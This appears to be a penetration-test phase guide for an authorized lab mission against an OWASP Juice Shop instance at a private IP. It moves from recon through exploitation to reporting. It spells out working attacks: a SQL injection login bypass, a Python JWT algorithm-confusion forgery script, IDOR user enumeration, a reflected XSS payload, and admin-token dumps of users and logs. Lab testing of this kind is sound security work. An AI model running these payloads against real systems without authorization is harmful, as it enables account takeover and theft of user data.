# Phase Execution Guide
## Mission: 20260312-0900-juiceshop-10103010
## Target: http://10.10.30.130 (OWASP Juice Shop)
## Date: 2026-03-12

---

## Pre-Flight Checklist

Before beginning any phase, confirm:
- [ ] Target is reachable: `curl -I http://10.10.30.130` returns HTTP 200 or 30x
- [ ] Tooling available: nikto, gobuster/ffuf, curl, jwt_tool or python-jwt, sqlmap (manual preferred)
- [ ] Working directory set to missions/10.10.30.130/
- [ ] findings.json initialized as an empty array `[]`

---

## Phase 1 — Passive Reconnaissance

**Goal:** Map the target without triggering alerts. Juice Shop has no WAF in standard lab config, but practice clean recon habits.

**Actions:**
1. `curl -I http://10.10.30.130` — capture response headers (Server, X-Powered-By, Content-Security-Policy, CORS headers)
2. `curl http://10.10.30.130/robots.txt` — check for disallowed paths
3. `curl http://10.10.30.130/sitemap.xml` — may expose challenge-related paths
4. Retrieve main JavaScript bundle: browse to `http://10.10.30.130` and inspect source for the Angular bundle. Use `grep -o '"[^"]*"' main*.js | grep "/"` to extract embedded routes.
5. Note all discovered paths for phase 2 directory confirmation.

**Deliverable:** `recon_notes.txt` — headers, disclosed paths, tech stack confirmation

---

## Phase 2 — Vulnerability Scanning

**Goal:** Confirm open directories and exposed endpoints identified in memory/recon.

**Actions:**
1. Nikto scan: `nikto -h http://10.10.30.130 -output nikto_scan.txt`
2. Directory confirmation (targeted, not brute-force — these are known paths):
   ```
   for path in /ftp/ /encryptionkeys/ /support/logs /b2b/v2 /assets/ /metrics /swagger; do
     curl -s -o /dev/null -w "%{http_code} $path\n" http://10.10.30.130$path
   done
   ```
3. HTTP method enum on key endpoints:
   `curl -X OPTIONS http://10.10.30.130/rest/user/login -i`
4. GraphQL probe:
   `curl -X POST http://10.10.30.130/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}'`

**Deliverable:** `scan_results.txt` — confirmed open paths and HTTP status codes

---

## Phase 3 — Deep Enumeration

**Goal:** Extract artifacts needed for exploitation, especially the JWT public key for EXP-02.

**Actions:**
1. FTP directory harvest:
   `curl http://10.10.30.130/ftp/` — list contents, then retrieve each file:
   `curl -O http://10.10.30.130/ftp/acquisition.md`
   `curl -O http://10.10.30.130/ftp/eastere.gg`
   Note any .kdbx files (credential store exposure evidence).

2. JWT key retrieval (prerequisite for EXP-02):
   `curl http://10.10.30.130/encryptionkeys/` — list directory
   `curl -O http://10.10.30.130/encryptionkeys/jwt.pub` (filename may vary — check directory listing)
   Confirm key format: should be PEM-encoded RSA public key beginning with `-----BEGIN PUBLIC KEY-----`

3. Log exposure:
   `curl http://10.10.30.130/support/logs/audit.json` — extract user activity and internal route data

4. REST API IDOR surface:
   ```
   for i in $(seq 1 10); do
     echo "User $i:"; curl -s http://10.10.30.130/api/Users/$i | python3 -m json.tool 2>/dev/null | head -5
   done
   ```

5. GraphQL full introspection:
   ```
   curl -X POST http://10.10.30.130/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name fields { name } } } }"}'
   ```
   Save output to `graphql_schema.json`

**Deliverable:** `jwt.pub` file saved, `ftp_inventory.txt`, `graphql_schema.json`, `enum_notes.txt`

---

## Phase 4 — Active Exploitation

**Goal:** Execute and document all 5 exploit candidates. Each must include full request, full response, and a one-line impact statement.

### EXP-01: SQL Injection Login Bypass

```bash
curl -X POST http://10.10.30.130/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' \
  -v 2>&1 | tee exp01_sqli_login.txt
```

Success: 200 response containing `authentication.token` and `data.email` showing admin account.

### EXP-02: JWT Algorithm Confusion (RS256 -> HS256)

Prerequisites: JWT public key from phase 3, a valid low-privilege token (obtain via normal registration).

Using `jwt_tool` or manual Python:
```python
import jwt, base64
# Load the RS256 public key bytes
with open('jwt.pub', 'rb') as f:
    pubkey = f.read()
# Decode a valid token to get the payload
payload = jwt.decode(existing_token, options={"verify_signature": False})
# Escalate role
payload['data']['role'] = 'admin'
# Re-sign using the public key as HS256 secret
forged = jwt.encode(payload, pubkey, algorithm='HS256')
print(forged)
```
Test forged token:
```bash
curl http://10.10.30.130/rest/user/whoami \
  -H "Authorization: Bearer <forged_token>" \
  -v 2>&1 | tee exp02_jwt_confusion.txt
```

Success: Server accepts token; response shows admin role/identity.

### EXP-03: Sensitive Data Exposure via Open /ftp/ Directory

```bash
curl -v http://10.10.30.130/ftp/ 2>&1 | tee exp03_ftp_open_dir.txt
curl -O http://10.10.30.130/ftp/acquisition.md
```

Success: HTTP 200, directory listing returned, sensitive files retrieved without authentication.

### EXP-04: IDOR via REST API User Enumeration

```bash
curl -v http://10.10.30.130/api/Users/1 2>&1 | tee exp04_idor_user1.txt
curl -v http://10.10.30.130/api/Users/2 2>&1 | tee exp04_idor_user2.txt
```

Success: User PII (email, password hash) returned for arbitrary user IDs without authorization check.

### EXP-05: Reflected XSS in Search

```bash
curl -v "http://10.10.30.130/#/search?q=<iframe%20src%3D%22javascript%3Aalert('xss')%22>" \
  2>&1 | tee exp05_xss_search.txt
```

Note: Juice Shop is an Angular SPA — XSS must be validated in a browser context, not just curl. Document the unescaped reflection in the HTTP response body AND confirm execution in browser devtools console.

**Deliverable:** `exp01_*.txt` through `exp05_*.txt` evidence files, `findings.json` populated

---

## Phase 5 — Post-Exploitation

**Goal:** Demonstrate blast radius of successful authentication bypass. No destructive actions.

**Actions (requires valid admin token from EXP-01 or EXP-02):**

1. Access admin configuration:
   ```bash
   curl http://10.10.30.130/rest/admin/application-configuration \
     -H "Authorization: Bearer <admin_token>" \
     -v 2>&1 | tee postex_app_config.txt
   ```

2. Full user dump:
   ```bash
   curl http://10.10.30.130/api/Users/ \
     -H "Authorization: Bearer <admin_token>" \
     -v 2>&1 | tee postex_user_dump.txt
   ```

3. Audit log retrieval:
   ```bash
   curl http://10.10.30.130/support/logs/audit.json \
     -H "Authorization: Bearer <admin_token>" \
     -v 2>&1 | tee postex_audit_log.txt
   ```

**Hard stops — do not proceed past these:**
- Do not PATCH or DELETE any user record
- Do not POST to /rest/admin/application-configuration
- Do not execute any order or payment flow
- Do not change passwords or emails

**Deliverable:** `postex_*.txt` files documenting data accessible to admin-level attacker

---

## Phase 6 — Reporting

**Required output files in missions/10.10.30.130/:**

| File | Format | Purpose |
|------|--------|---------|
| `findings.json` | JSON array | Machine-readable exploit confirmations with severity, OWASP category, repro steps |
| `executive_summary.md` | Markdown | Plain-language 1-page impact narrative for non-technical stakeholders |
| `remediation_notes.md` | Markdown | Per-finding fix recommendations keyed to EXP-01 through EXP-05 |

**findings.json schema per entry:**
```json
{
  "exploit_id": "EXP-01",
  "vulnerability": "<name>",
  "owasp_category": "<A0X:2021 Name>",
  "severity": "<Critical|High|Medium|Low>",
  "endpoint": "<method path>",
  "confirmed": true,
  "evidence_file": "<filename>",
  "reproduction_steps": ["step 1", "step 2"],
  "impact": "<one sentence>"
}
```

**Mission closure:** Update `mission_plan.json` status field from `"planned"` to `"completed"` and write confirmed exploit IDs to a summary line in `findings.json`.

---

## Abort Conditions

Stop the mission immediately and report if any of the following occur:
- Target becomes unreachable mid-mission (possible unintended crash from fuzzing rate)
- Evidence of another user or active session on the Juice Shop instance
- Any response indicating traffic is routing outside the 10.10.30.130 host
- Tool behavior that would write to or modify files outside missions/10.10.30.130/
